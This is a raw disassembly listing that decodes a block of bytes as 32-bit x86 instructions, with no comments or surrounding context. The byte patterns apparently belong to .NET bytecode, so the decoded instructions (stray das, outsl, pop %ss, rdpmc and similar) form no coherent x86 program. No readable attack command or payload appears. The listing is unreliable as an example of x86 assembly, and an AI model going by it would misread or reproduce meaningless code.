  4025da:	3e 00 00             	add    %al,%ds:(%eax)
  4025dd:	06                   	push   %es
  4025de:	7d 17                	jge    0x4025f7
  4025e0:	00 00                	add    %al,(%eax)
  4025e2:	04 02                	add    $0x2,%al
  4025e4:	02 fe                	add    %dh,%bh
  4025e6:	06                   	push   %es
  4025e7:	2f                   	das
  4025e8:	00 00                	add    %al,(%eax)
  4025ea:	06                   	push   %es
  4025eb:	73 42                	jae    0x40262f
  4025ed:	00 00                	add    %al,(%eax)
  4025ef:	06                   	push   %es
  4025f0:	7d 18                	jge    0x40260a
  4025f2:	00 00                	add    %al,(%eax)
  4025f4:	04 2a                	add    $0x2a,%al
  4025f6:	b2 02                	mov    $0x2,%dl
  4025f8:	02 fe                	add    %dh,%bh
  4025fa:	06                   	push   %es
  4025fb:	2a 00                	sub    (%eax),%al
  4025fd:	00 06                	add    %al,(%esi)
  4025ff:	73 36                	jae    0x402637
  402601:	00 00                	add    %al,(%eax)
  402603:	06                   	push   %es
  402604:	7d 15                	jge    0x40261b
  402606:	00 00                	add    %al,(%eax)
  402608:	04 02                	add    $0x2,%al
  40260a:	7b 15                	jnp    0x402621
  40260c:	00 00                	add    %al,(%eax)
  40260e:	04 02                	add    $0x2,%al
  402610:	fe 06                	incb   (%esi)
  402612:	2b 00                	sub    (%eax),%eax
  402614:	00 06                	add    %al,(%esi)
  402616:	73 1d                	jae    0x402635
  402618:	00 00                	add    %al,(%eax)
  40261a:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  40261d:	38 00                	cmp    %al,(%eax)
  40261f:	00 06                	add    %al,(%esi)
  402621:	26 2a 00             	sub    %es:(%eax),%al
  402624:	1b 30                	sbb    (%eax),%esi
  402626:	04 00                	add    $0x0,%al
  402628:	4c                   	dec    %esp
  402629:	00 00                	add    %al,(%eax)
  40262b:	00 04 00             	add    %al,(%eax,%eax,1)
  40262e:	00 11                	add    %dl,(%ecx)
  402630:	02 18                	add    (%eax),%bl
  402632:	17                   	pop    %ss
  402633:	1c 73                	sbb    $0x73,%al
  402635:	1e                   	push   %ds
  402636:	00 00                	add    %al,(%eax)
  402638:	0a 28                	or     (%eax),%ch
  40263a:	1d 00 00 06 02       	sbb    $0x2060000,%eax
  40263f:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402642:	00 06                	add    %al,(%esi)
  402644:	20 ff                	and    %bh,%bh
  402646:	ff 00                	incl   (%eax)
  402648:	00 1e                	add    %bl,(%esi)
  40264a:	17                   	pop    %ss
  40264b:	6f                   	outsl  %ds:(%esi),(%dx)
  40264c:	1f                   	pop    %ds
  40264d:	00 00                	add    %al,(%eax)
  40264f:	0a 02                	or     (%edx),%al
  402651:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402654:	00 06                	add    %al,(%esi)
  402656:	02 28                	add    (%eax),%ch
  402658:	1a 00                	sbb    (%eax),%al
  40265a:	00 06                	add    %al,(%esi)
  40265c:	6f                   	outsl  %ds:(%esi),(%dx)
  40265d:	20 00                	and    %al,(%eax)
  40265f:	00 0a                	add    %cl,(%edx)
  402661:	02 28                	add    (%eax),%ch
  402663:	1a 00                	sbb    (%eax),%al
  402665:	00 06                	add    %al,(%esi)
  402667:	6f                   	outsl  %ds:(%esi),(%dx)
  402668:	21 00                	and    %eax,(%eax)
  40266a:	00 0a                	add    %cl,(%edx)
  40266c:	6f                   	outsl  %ds:(%esi),(%dx)
  40266d:	22 00                	and    (%eax),%al
  40266f:	00 0a                	add    %cl,(%edx)
  402671:	17                   	pop    %ss
  402672:	0a de                	or     %dh,%bl
  402674:	05 26 de 00 16       	add    $0x1600de26,%eax
  402679:	2a 06                	sub    (%esi),%al
  40267b:	2a 01                	sub    (%ecx),%al
  40267d:	10 00                	adc    %al,(%eax)
  40267f:	00 00                	add    %al,(%eax)
  402681:	00 00                	add    %al,(%eax)
  402683:	00 45 45             	add    %al,0x45(%ebp)
  402686:	00 03                	add    %al,(%ebx)
  402688:	01 00                	add    %eax,(%eax)
  40268a:	00 01                	add    %al,(%ecx)
  40268c:	c6 02 02             	movb   $0x2,(%edx)
  40268f:	7b 15                	jnp    0x4026a6
  402691:	00 00                	add    %al,(%eax)
  402693:	04 03                	add    $0x3,%al
  402695:	6f                   	outsl  %ds:(%esi),(%dx)
  402696:	39 00                	cmp    %eax,(%eax)
  402698:	00 06                	add    %al,(%esi)
  40269a:	28 1f                	sub    %bl,(%edi)
  40269c:	00 00                	add    %al,(%eax)
  40269e:	06                   	push   %es
  40269f:	02 28                	add    (%eax),%ch
  4026a1:	26 00 00             	add    %al,%es:(%eax)
  4026a4:	06                   	push   %es
  4026a5:	2c 01                	sub    $0x1,%al
  4026a7:	2a 02                	sub    (%edx),%al
  4026a9:	28 1e                	sub    %bl,(%esi)
  4026ab:	00 00                	add    %al,(%eax)
  4026ad:	06                   	push   %es
  4026ae:	2d 07 02 28 29       	sub    $0x29280207,%eax
  4026b3:	00 00                	add    %al,(%eax)
  4026b5:	06                   	push   %es
  4026b6:	2a 02                	sub    (%edx),%al
  4026b8:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4026bb:	00 06                	add    %al,(%esi)
  4026bd:	2a ca                	sub    %dl,%cl
  4026bf:	02 28                	add    (%eax),%ch
  4026c1:	26 00 00             	add    %al,%es:(%eax)
  4026c4:	06                   	push   %es
  4026c5:	2c 01                	sub    $0x1,%al
  4026c7:	2a 02                	sub    (%edx),%al
  4026c9:	28 1e                	sub    %bl,(%esi)
  4026cb:	00 00                	add    %al,(%eax)
  4026cd:	06                   	push   %es
  4026ce:	2c 1a                	sub    $0x1a,%al
  4026d0:	02 7b 17             	add    0x17(%ebx),%bh
  4026d3:	00 00                	add    %al,(%eax)
  4026d5:	04 02                	add    $0x2,%al
  4026d7:	fe 06                	incb   (%esi)
  4026d9:	2e 00 00             	add    %al,%cs:(%eax)
  4026dc:	06                   	push   %es
  4026dd:	73 1d                	jae    0x4026fc
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  4026e4:	40                   	inc    %eax
  4026e5:	00 00                	add    %al,(%eax)
  4026e7:	06                   	push   %es
  4026e8:	26 2a 02             	sub    %es:(%edx),%al
  4026eb:	28 29                	sub    %ch,(%ecx)
  4026ed:	00 00                	add    %al,(%eax)
  4026ef:	06                   	push   %es
  4026f0:	2a 00                	sub    (%eax),%al
  4026f2:	00 00                	add    %al,(%eax)
  4026f4:	1b 30                	sbb    (%eax),%esi
  4026f6:	05 00 81 00 00       	add    $0x8100,%eax
  4026fb:	00 05 00 00 11 16    	add    %al,0x16110000
  402701:	0a 1a                	or     (%edx),%bl
  402703:	8d 0b                	lea    (%ebx),%ecx
  402705:	00 00                	add    %al,(%eax)
  402707:	01 0c 02             	add    %ecx,(%edx,%eax,1)
  40270a:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  40270d:	00 06                	add    %al,(%esi)
  40270f:	15 16 6f 23 00       	adc    $0x236f16,%eax
  402714:	00 0a                	add    %cl,(%edx)
  402716:	26 02 28             	add    %es:(%eax),%ch
  402719:	1c 00                	sbb    $0x0,%al
  40271b:	00 06                	add    %al,(%esi)
  40271d:	08 16                	or     %dl,(%esi)
  40271f:	1a 16                	sbb    (%esi),%dl
  402721:	6f                   	outsl  %ds:(%esi),(%dx)
  402722:	24 00                	and    $0x0,%al
  402724:	00 0a                	add    %cl,(%edx)
  402726:	0b 08                	or     (%eax),%ecx
  402728:	16                   	push   %ss
  402729:	28 25 00 00 0a 0d    	sub    %ah,0xd0a0000
  40272f:	09 13                	or     %edx,(%ebx)
  402731:	04 09                	add    $0x9,%al
  402733:	8d 0b                	lea    (%ebx),%ecx
  402735:	00 00                	add    %al,(%eax)
  402737:	01 13                	add    %edx,(%ebx)
  402739:	05 2b 1c 02 28       	add    $0x28021c2b,%eax
  40273e:	1c 00                	sbb    $0x0,%al
  402740:	00 06                	add    %al,(%esi)
  402742:	11 05 06 11 04 16    	adc    %eax,0x16041106
  402748:	6f                   	outsl  %ds:(%esi),(%dx)
  402749:	24 00                	and    $0x0,%al
  40274b:	00 0a                	add    %cl,(%edx)
  40274d:	0b 06                	or     (%esi),%eax
  40274f:	07                   	pop    %es
  402750:	58                   	pop    %eax
  402751:	0a 11                	or     (%ecx),%dl
  402753:	04 07                	add    $0x7,%al
  402755:	59                   	pop    %ecx
  402756:	13 04 06             	adc    (%esi,%eax,1),%eax
  402759:	09 32                	or     %esi,(%edx)
  40275b:	e0 11                	loopne 0x40276e
  40275d:	05 13 06 de 1c       	add    $0x1cde0613,%eax
  402762:	26 02 28             	add    %es:(%eax),%ch
  402765:	1e                   	push   %ds
  402766:	00 00                	add    %al,(%eax)
  402768:	06                   	push   %es
  402769:	2c 07                	sub    $0x7,%al
  40276b:	02 17                	add    (%edi),%dl
  40276d:	28 27                	sub    %ah,(%edi)
  40276f:	00 00                	add    %al,(%eax)
  402771:	06                   	push   %es
  402772:	02 16                	add    (%esi),%dl
  402774:	28 1f                	sub    %bl,(%edi)
  402776:	00 00                	add    %al,(%eax)
  402778:	06                   	push   %es
  402779:	14 13                	adc    $0x13,%al
  40277b:	06                   	push   %es
  40277c:	de 00                	fiadds (%eax)
  40277e:	11 06                	adc    %eax,(%esi)
  402780:	2a 00                	sub    (%eax),%al
  402782:	00 00                	add    %al,(%eax)
  402784:	01 10                	add    %edx,(%eax)
  402786:	00 00                	add    %al,(%eax)
  402788:	00 00                	add    %al,(%eax)
  40278a:	00 00                	add    %al,(%eax)
  40278c:	62 62 00             	bound  %esp,0x0(%edx)
  40278f:	1c 09                	sbb    $0x9,%al
  402791:	00 00                	add    %al,(%eax)
  402793:	01 13                	add    %edx,(%ebx)
  402795:	30 04 00             	xor    %al,(%eax,%eax,1)
  402798:	39 00                	cmp    %eax,(%eax)
  40279a:	00 00                	add    %al,(%eax)
  40279c:	06                   	push   %es
  40279d:	00 00                	add    %al,(%eax)
  40279f:	11 02                	adc    %eax,(%edx)
  4027a1:	7b 17                	jnp    0x4027ba
  4027a3:	00 00                	add    %al,(%eax)
  4027a5:	04 03                	add    $0x3,%al
  4027a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4027a8:	41                   	inc    %ecx
  4027a9:	00 00                	add    %al,(%eax)
  4027ab:	06                   	push   %es
  4027ac:	0a 06                	or     (%esi),%al
  4027ae:	2c 22                	sub    $0x22,%al
  4027b0:	02 28                	add    (%eax),%ch
  4027b2:	1e                   	push   %ds
  4027b3:	00 00                	add    %al,(%eax)
  4027b5:	06                   	push   %es
  4027b6:	2c 1a                	sub    $0x1a,%al
  4027b8:	02 7b 18             	add    0x18(%ebx),%bh
  4027bb:	00 00                	add    %al,(%eax)
  4027bd:	04 06                	add    $0x6,%al
  4027bf:	02 fe                	add    %dh,%bh
  4027c1:	06                   	push   %es
  4027c2:	30 00                	xor    %al,(%eax)
  4027c4:	00 06                	add    %al,(%esi)
  4027c6:	73 1d                	jae    0x4027e5
  4027c8:	00 00                	add    %al,(%eax)
  4027ca:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  4027cd:	44                   	inc    %esp
  4027ce:	00 00                	add    %al,(%eax)
  4027d0:	06                   	push   %es
  4027d1:	26 02 28             	add    %es:(%eax),%ch
  4027d4:	2c 00                	sub    $0x0,%al
  4027d6:	00 06                	add    %al,(%esi)
  4027d8:	2a 32                	sub    (%edx),%dh
  4027da:	03 7e 1a             	add    0x1a(%esi),%edi
  4027dd:	00 00                	add    %al,(%eax)
  4027df:	04 28                	add    $0x28,%al
  4027e1:	26 00 00             	add    %al,%es:(%eax)
  4027e4:	0a 2a                	or     (%edx),%ch
  4027e6:	00 00                	add    %al,(%eax)
  4027e8:	13 30                	adc    (%eax),%esi
  4027ea:	02 00                	add    (%eax),%al
  4027ec:	15 00 00 00 07       	adc    $0x7000000,%eax
  4027f1:	00 00                	add    %al,(%eax)
  4027f3:	11 02                	adc    %eax,(%edx)
  4027f5:	7b 18                	jnp    0x40280f
  4027f7:	00 00                	add    %al,(%eax)
  4027f9:	04 03                	add    $0x3,%al
  4027fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4027fc:	45                   	inc    %ebp
  4027fd:	00 00                	add    %al,(%eax)
  4027ff:	06                   	push   %es
  402800:	0a 02                	or     (%edx),%al
  402802:	06                   	push   %es
  402803:	28 31                	sub    %dh,(%ecx)
  402805:	00 00                	add    %al,(%eax)
  402807:	06                   	push   %es
  402808:	2a 76 03             	sub    0x3(%esi),%dh
  40280b:	6f                   	outsl  %ds:(%esi),(%dx)
  40280c:	27                   	daa
  40280d:	00 00                	add    %al,(%eax)
  40280f:	0a 1f                	or     (%edi),%bl
  402811:	0f 33                	rdpmc
  402813:	12 02                	adc    (%edx),%al
  402815:	17                   	pop    %ss
  402816:	28 27                	sub    %ah,(%edi)
  402818:	00 00                	add    %al,(%eax)
  40281a:	06                   	push   %es
  40281b:	28 03                	sub    %al,(%ebx)
  40281d:	00 00                	add    %al,(%eax)
  40281f:	06                   	push   %es
  402820:	02 28                	add    (%eax),%ch
  402822:	35 00 00 06 2a       	xor    $0x2a060000,%eax
  402827:	8e 02                	mov    (%edx),%es
  402829:	28 1e                	sub    %bl,(%esi)
  40282b:	00 00                	add    %al,(%eax)
  40282d:	06                   	push   %es
  40282e:	2c 1a                	sub    $0x1a,%al
  402830:	02 7b 16             	add    0x16(%ebx),%bh
  402833:	00 00                	add    %al,(%eax)
  402835:	04 03                	add    $0x3,%al
  402837:	02 fe                	add    %dh,%bh
  402839:	06                   	push   %es
  40283a:	34 00                	xor    $0x0,%al
  40283c:	00 06                	add    %al,(%esi)
  40283e:	73 1d                	jae    0x40285d
  402840:	00 00                	add    %al,(%eax)
  402842:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402845:	3c 00                	cmp    $0x0,%al
  402847:	00 06                	add    %al,(%esi)
  402849:	26 2a 00             	sub    %es:(%eax),%al
  40284c:	1b 30                	sbb    (%eax),%esi
  40284e:	05 00 9b 00 00       	add    $0x9b00,%eax
  402853:	00 08                	add    %cl,(%eax)
  402855:	00 00                	add    %al,(%eax)
  402857:	11 03                	adc    %eax,(%ebx)
  402859:	02 28                	add    (%eax),%ch
  40285b:	24 00                	and    $0x0,%al
  40285d:	00 06                	add    %al,(%esi)
  40285f:	28 28                	sub    %ch,(%eax)
  402861:	00 00                	add    %al,(%eax)
  402863:	0a 0a                	or     (%edx),%cl
  402865:	02 28                	add    (%eax),%ch
  402867:	1c 00                	sbb    $0x0,%al
  402869:	00 06                	add    %al,(%esi)
  40286b:	0b 16                	or     (%esi),%edx
  40286d:	0c 07                	or     $0x7,%al
  40286f:	12 02                	adc    (%edx),%al
  402871:	28 29                	sub    %ch,(%ecx)
  402873:	00 00                	add    %al,(%eax)
  402875:	0a 16                	or     (%esi),%dl
  402877:	0d 06 8e 69 13       	or     $0x13698e06,%eax
  40287c:	04 11                	add    $0x11,%al
  40287e:	04 13                	add    $0x13,%al
  402880:	05 1a 8d 0b 00       	add    $0xb8d1a,%eax
  402885:	00 01                	add    %al,(%ecx)
  402887:	13 06                	adc    (%esi),%eax
  402889:	02 28                	add    (%eax),%ch
  40288b:	1c 00                	sbb    $0x0,%al
  40288d:	00 06                	add    %al,(%esi)
  40288f:	15 17 6f 23 00       	adc    $0x236f17,%eax
  402894:	00 0a                	add    %cl,(%edx)
  402896:	26 11 04 28          	adc    %eax,%es:(%eax,%ebp,1)
  40289a:	2a 00                	sub    (%eax),%al
  40289c:	00 0a                	add    %cl,(%edx)
  40289e:	13 06                	adc    (%esi),%eax
  4028a0:	02 28                	add    (%eax),%ch
  4028a2:	1c 00                	sbb    $0x0,%al
  4028a4:	00 06                	add    %al,(%esi)
  4028a6:	11 06                	adc    %eax,(%esi)
  4028a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4028a9:	2b 00                	sub    (%eax),%eax
  4028ab:	00 0a                	add    %cl,(%edx)
  4028ad:	13 07                	adc    (%edi),%eax
  4028af:	2b 1e                	sub    (%esi),%ebx
  4028b1:	02 28                	add    (%eax),%ch
  4028b3:	1c 00                	sbb    $0x0,%al
  4028b5:	00 06                	add    %al,(%esi)
  4028b7:	06                   	push   %es
  4028b8:	09 11                	or     %edx,(%ecx)
  4028ba:	04 16                	add    $0x16,%al
  4028bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4028bd:	2c 00                	sub    $0x0,%al
  4028bf:	00 0a                	add    %cl,(%edx)
  4028c1:	13 07                	adc    (%edi),%eax
  4028c3:	09 11                	or     %edx,(%ecx)
  4028c5:	07                   	pop    %es
  4028c6:	58                   	pop    %eax
  4028c7:	0d 11 05 11 07       	or     $0x7110511,%eax
  4028cc:	59                   	pop    %ecx
  4028cd:	13 05 09 11 04 32    	adc    0x32041109,%eax
  4028d3:	dd 09                	fisttpll (%ecx)
  4028d5:	13 08                	adc    (%eax),%ecx
  4028d7:	de 17                	ficoms (%edi)
  4028d9:	08 2c 06             	or     %ch,(%esi,%eax,1)
  4028dc:	07                   	pop    %es
  4028dd:	28 2d 00 00 0a dc    	sub    %ch,0xdc0a0000
  4028e3:	26 02 16             	add    %es:(%esi),%dl
  4028e6:	28 1f                	sub    %bl,(%edi)
  4028e8:	00 00                	add    %al,(%eax)
  4028ea:	06                   	push   %es
  4028eb:	16                   	push   %ss
  4028ec:	13 08                	adc    (%eax),%ecx
  4028ee:	de 00                	fiadds (%eax)
  4028f0:	11 08                	adc    %ecx,(%eax)
  4028f2:	2a 00                	sub    (%eax),%al
  4028f4:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4028f7:	00 02                	add    %al,(%edx)
  4028f9:	00 16                	add    %dl,(%esi)
  4028fb:	00 6b 81             	add    %ch,-0x7f(%ebx)
  4028fe:	00 0a                	add    %cl,(%edx)
	...
  402908:	8b 8b 00 0d 09 00    	mov    0x90d00(%ebx),%ecx
  40290e:	00 01                	add    %al,(%ecx)
  402910:	13 30                	adc    (%eax),%esi
  402912:	02 00                	add    (%eax),%al
  402914:	18 00                	sbb    %al,(%eax)
  402916:	00 00                	add    %al,(%eax)
  402918:	09 00                	or     %eax,(%eax)
  40291a:	00 11                	add    %dl,(%ecx)
  40291c:	02 7b 16             	add    0x16(%ebx),%bh
  40291f:	00 00                	add    %al,(%eax)
  402921:	04 03                	add    $0x3,%al
  402923:	6f                   	outsl  %ds:(%esi),(%dx)
  402924:	3d 00 00 06 0a       	cmp    $0xa060000,%eax
  402929:	02 28                	add    (%eax),%ch
  40292b:	1e                   	push   %ds
  40292c:	00 00                	add    %al,(%eax)
  40292e:	06                   	push   %es
  40292f:	2c 02                	sub    $0x2,%al
  402931:	06                   	push   %es
  402932:	26 2a 7a 02          	sub    %es:0x2(%edx),%bh
  402936:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402939:	00 06                	add    %al,(%esi)
  40293b:	6f                   	outsl  %ds:(%esi),(%dx)
  40293c:	2e 00 00             	add    %al,%cs:(%eax)
  40293f:	0a 02                	or     (%edx),%al
  402941:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402944:	00 06                	add    %al,(%esi)
  402946:	6f                   	outsl  %ds:(%esi),(%dx)
  402947:	2f                   	das
  402948:	00 00                	add    %al,(%eax)
  40294a:	0a 02                	or     (%edx),%al
  40294c:	14 28                	adc    $0x28,%al
  40294e:	1d 00 00 06 2a       	sbb    $0x2a060000,%eax
  402953:	00 13                	add    %dl,(%ebx)
  402955:	30 02                	xor    %al,(%edx)
  402957:	00 5a 00             	add    %bl,0x0(%edx)
  40295a:	00 00                	add    %al,(%eax)
  40295c:	00 00                	add    %al,(%eax)
  40295e:	00 00                	add    %al,(%eax)
  402960:	02 6f 30             	add    0x30(%edi),%ch
  402963:	00 00                	add    %al,(%eax)
  402965:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  40296b:	02 6f 31             	add    0x31(%edi),%ch
  40296e:	00 00                	add    %al,(%eax)
  402970:	0a 80 1b 00 00 04    	or     0x400001b(%eax),%al
  402976:	02 6f 32             	add    0x32(%edi),%ch
  402979:	00 00                	add    %al,(%eax)
  40297b:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  402981:	02 6f 33             	add    0x33(%edi),%ch
  402984:	00 00                	add    %al,(%eax)
  402986:	0a 6f 27             	or     0x27(%edi),%ch
  402989:	00 00                	add    %al,(%eax)
  40298b:	0a 1f                	or     (%edi),%bl
  40298d:	0e                   	push   %cs
  40298e:	33 24 02             	xor    (%edx,%eax,1),%esp
  402991:	6f                   	outsl  %ds:(%esi),(%dx)
  402992:	34 00                	xor    $0x0,%al
  402994:	00 0a                	add    %cl,(%edx)
  402996:	7e 1a                	jle    0x4029b2
  402998:	00 00                	add    %al,(%eax)
  40299a:	04 73                	add    $0x73,%al
  40299c:	28 00                	sub    %al,(%eax)
  40299e:	00 06                	add    %al,(%esi)
  4029a0:	80 19 00             	sbbb   $0x0,(%ecx)
  4029a3:	00 04 7e             	add    %al,(%esi,%edi,2)
  4029a6:	19 00                	sbb    %eax,(%eax)
  4029a8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4029ab:	29 00                	sub    %eax,(%eax)
  4029ad:	00 06                	add    %al,(%esi)
  4029af:	28 04 00             	sub    %al,(%eax,%eax,1)
  4029b2:	00 06                	add    %al,(%esi)
  4029b4:	28 35 00 00 0a 2a    	sub    %dh,0x2a0a0000
  4029ba:	42                   	inc    %edx
  4029bb:	02 2d 06 72 09 00    	add    0x97206,%ch
  4029c1:	00 70 2a             	add    %dh,0x2a(%eax)
  4029c4:	02 6f 36             	add    0x36(%edi),%ch
  4029c7:	00 00                	add    %al,(%eax)
  4029c9:	0a 2a                	or     (%edx),%ch
  4029cb:	00 13                	add    %dl,(%ebx)
  4029cd:	30 03                	xor    %al,(%ebx)
  4029cf:	00 5a 00             	add    %bl,0x0(%edx)
  4029d2:	00 00                	add    %al,(%eax)
  4029d4:	0a 00                	or     (%eax),%al
  4029d6:	00 11                	add    %dl,(%ecx)
  4029d8:	28 37                	sub    %dh,(%edi)
  4029da:	00 00                	add    %al,(%eax)
  4029dc:	0a 6f 38             	or     0x38(%edi),%ch
  4029df:	00 00                	add    %al,(%eax)
  4029e1:	0a 0a                	or     (%edx),%cl
  4029e3:	16                   	push   %ss
  4029e4:	0b 2b                	or     (%ebx),%ebp
  4029e6:	43                   	inc    %ebx
  4029e7:	06                   	push   %es
  4029e8:	07                   	pop    %es
  4029e9:	9a 0c 08 6f 39 00 00 	lcall  $0x0,$0x396f080c
  4029f0:	0a 0d 09 6f 3a 00    	or     0x3a6f09,%cl
  4029f6:	00 0a                	add    %cl,(%edx)
  4029f8:	02 6f 3a             	add    0x3a(%edi),%ch
  4029fb:	00 00                	add    %al,(%eax)
  4029fd:	0a 19                	or     (%ecx),%bl
  4029ff:	28 3b                	sub    %bh,(%ebx)
  402a01:	00 00                	add    %al,(%eax)
  402a03:	0a 2c 20             	or     (%eax,%eiz,1),%ch
  402a06:	09 6f 3c             	or     %ebp,0x3c(%edi)
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	0a 28                	or     (%eax),%ch
  402a0d:	47                   	inc    %edi
  402a0e:	00 00                	add    %al,(%eax)
  402a10:	06                   	push   %es
  402a11:	02 6f 3c             	add    0x3c(%edi),%ch
  402a14:	00 00                	add    %al,(%eax)
  402a16:	0a 28                	or     (%eax),%ch
  402a18:	47                   	inc    %edi
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	06                   	push   %es
  402a1c:	19 28                	sbb    %ebp,(%eax)
  402a1e:	3b 00                	cmp    (%eax),%eax
  402a20:	00 0a                	add    %cl,(%edx)
  402a22:	2c 02                	sub    $0x2,%al
  402a24:	08 2a                	or     %ch,(%edx)
  402a26:	07                   	pop    %es
  402a27:	17                   	pop    %ss
  402a28:	58                   	pop    %eax
  402a29:	0b 07                	or     (%edi),%eax
  402a2b:	06                   	push   %es
  402a2c:	8e 69 32             	mov    0x32(%ecx),%gs
  402a2f:	b7 14                	mov    $0x14,%bh
  402a31:	2a 00                	sub    (%eax),%al
  402a33:	00 13                	add    %dl,(%ebx)
  402a35:	30 04 00             	xor    %al,(%eax,%eax,1)
  402a38:	26 00 00             	add    %al,%es:(%eax)
  402a3b:	00 0b                	add    %cl,(%ebx)
  402a3d:	00 00                	add    %al,(%eax)
  402a3f:	11 20                	adc    %esp,(%eax)
  402a41:	00 40 01             	add    %al,0x1(%eax)
  402a44:	00 8d 0b 00 00 01    	add    %cl,0x100000b(%ebp)
  402a4a:	0a 2b                	or     (%ebx),%ch
  402a4c:	09 03                	or     %eax,(%ebx)
  402a4e:	06                   	push   %es
  402a4f:	16                   	push   %ss
  402a50:	07                   	pop    %es
  402a51:	6f                   	outsl  %ds:(%esi),(%dx)
  402a52:	3d 00 00 0a 02       	cmp    $0x20a0000,%eax
  402a57:	06                   	push   %es
  402a58:	16                   	push   %ss
  402a59:	06                   	push   %es
  402a5a:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402a5d:	3e 00 00             	add    %al,%ds:(%eax)
  402a60:	0a 25 0b 2d e8 2a    	or     0x2ae82d0b,%ah
  402a66:	00 00                	add    %al,(%eax)
  402a68:	1b 30                	sbb    (%eax),%esi
  402a6a:	02 00                	add    (%eax),%al
  402a6c:	5c                   	pop    %esp
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a72:	00 11                	add    %dl,(%ecx)
  402a74:	28 3f                	sub    %bh,(%edi)
  402a76:	00 00                	add    %al,(%eax)
  402a78:	0a 0a                	or     (%edx),%cl
  402a7a:	02 72 a1             	add    -0x5f(%edx),%dh
  402a7d:	00 00                	add    %al,(%eax)
  402a7f:	70 6f                	jo     0x402af0
  402a81:	40                   	inc    %eax
  402a82:	00 00                	add    %al,(%eax)
  402a84:	0a 2c 3e             	or     (%esi,%edi,1),%ch
  402a87:	06                   	push   %es
  402a88:	02 6f 41             	add    0x41(%edi),%ch
  402a8b:	00 00                	add    %al,(%eax)
  402a8d:	0a 0b                	or     (%ebx),%cl
  402a8f:	07                   	pop    %es
  402a90:	16                   	push   %ss
  402a91:	73 42                	jae    0x402ad5
  402a93:	00 00                	add    %al,(%eax)
  402a95:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  402a98:	43                   	inc    %ebx
  402a99:	00 00                	add    %al,(%eax)
  402a9b:	0a 0d 08 09 28 49    	or     0x49280908,%cl
  402aa1:	00 00                	add    %al,(%eax)
  402aa3:	06                   	push   %es
  402aa4:	09 16                	or     %edx,(%esi)
  402aa6:	6a 6f                	push   $0x6f
  402aa8:	44                   	inc    %esp
  402aa9:	00 00                	add    %al,(%eax)
  402aab:	0a 09                	or     (%ecx),%cl
  402aad:	13 04 de             	adc    (%esi,%ebx,8),%eax
  402ab0:	1c 08                	sbb    $0x8,%al
  402ab2:	2c 06                	sub    $0x6,%al
  402ab4:	08 6f 45             	or     %ch,0x45(%edi)
  402ab7:	00 00                	add    %al,(%eax)
  402ab9:	0a dc                	or     %ah,%bl
  402abb:	07                   	pop    %es
  402abc:	2c 06                	sub    $0x6,%al
  402abe:	07                   	pop    %es
  402abf:	6f                   	outsl  %ds:(%esi),(%dx)
  402ac0:	45                   	inc    %ebp
  402ac1:	00 00                	add    %al,(%eax)
  402ac3:	0a dc                	or     %ah,%bl
  402ac5:	06                   	push   %es
  402ac6:	02 6f 41             	add    0x41(%edi),%ch
  402ac9:	00 00                	add    %al,(%eax)
  402acb:	0a 2a                	or     (%edx),%ch
  402acd:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  402ad0:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402ad3:	00 02                	add    %al,(%edx)
  402ad5:	00 23                	add    %ah,(%ebx)
  402ad7:	00 1a                	add    %bl,(%edx)
  402ad9:	3d 00 0a 00 00       	cmp    $0xa00,%eax
  402ade:	00 00                	add    %al,(%eax)
  402ae0:	02 00                	add    (%eax),%al
  402ae2:	1b 00                	sbb    (%eax),%eax
  402ae4:	2c 47                	sub    $0x47,%al
  402ae6:	00 0a                	add    %cl,(%edx)
  402ae8:	00 00                	add    %al,(%eax)
  402aea:	00 00                	add    %al,(%eax)
  402aec:	13 30                	adc    (%eax),%esi
  402aee:	03 00                	add    (%eax),%eax
  402af0:	14 00                	adc    $0x0,%al
  402af2:	00 00                	add    %al,(%eax)
  402af4:	0d 00 00 11 02       	or     $0x2110000,%eax
  402af9:	03 12                	add    (%edx),%edx
  402afb:	00 6f 46             	add    %ch,0x46(%edi)
  402afe:	00 00                	add    %al,(%eax)
  402b00:	0a 2c 07             	or     (%edi,%eax,1),%ch
  402b03:	06                   	push   %es
  402b04:	28 4a 00             	sub    %cl,0x0(%edx)
  402b07:	00 06                	add    %al,(%esi)
  402b09:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  402b0c:	13 30                	adc    (%eax),%esi
  402b0e:	04 00                	add    $0x0,%al
  402b10:	1b 00                	sbb    (%eax),%eax
  402b12:	00 00                	add    %al,(%eax)
  402b14:	06                   	push   %es
  402b15:	00 00                	add    %al,(%eax)
  402b17:	11 02                	adc    %eax,(%edx)
  402b19:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1a:	47                   	inc    %edi
  402b1b:	00 00                	add    %al,(%eax)
  402b1d:	0a d4                	or     %ah,%dl
  402b1f:	8d 0b                	lea    (%ebx),%ecx
  402b21:	00 00                	add    %al,(%eax)
  402b23:	01 0a                	add    %ecx,(%edx)
  402b25:	02 06                	add    (%esi),%al
  402b27:	16                   	push   %ss
  402b28:	06                   	push   %es
  402b29:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402b2c:	3e 00 00             	add    %al,%ds:(%eax)
  402b2f:	0a 26                	or     (%esi),%ah
